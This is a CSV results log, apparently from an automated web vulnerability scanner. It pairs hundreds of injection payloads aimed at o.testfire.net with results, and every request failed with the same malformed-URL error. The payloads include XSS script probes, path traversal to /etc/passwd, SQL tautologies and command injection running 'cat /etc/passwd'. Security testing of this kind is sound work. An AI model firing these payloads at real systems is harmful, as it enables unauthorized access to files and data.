payload,reflected,error
<script>alert(99)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 97=97 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #140,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #139,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(74)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #173,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #169,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 125=125 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 85=85 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 15=15 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 99=99 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #65,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(198)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #200,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 154=154 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(52)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #32,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #24,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #184,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #70,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #188,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(84)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 38=38 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #166,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(147)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 70=70 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(129)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(200)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 196=196 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 95=95 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #192,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(97)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(188)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 147=147 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 31=31 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 131=131 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(12)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(28)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 161=161 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 48=48 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 143=143 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 11=11 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #110,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #99,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(122)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 140=140 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 177=177 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 186=186 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(32)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 109=109 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 159=159 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #56,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #178,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(118)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 146=146 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #132,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #39,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(49)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 184=184 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(192)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(115)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #29,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(133)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #187,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #68,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 28=28 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #80,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #14,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 121=121 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 108=108 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #5,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #46,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #111,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(91)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 29=29 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 71=71 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(143)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 195=195 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 111=111 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(104)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #55,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 127=127 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 94=94 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #185,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #74,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(148)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 62=62 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #128,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #79,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #161,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 150=150 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 4=4 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #93,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #157,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(50)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(5)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #107,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(123)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #54,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(128)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #22,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #171,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(37)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(139)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 25=25 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #13,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(150)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 165=165 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(18)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #10,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #186,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(51)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(191)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 106=106 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #94,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #83,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(19)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(190)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
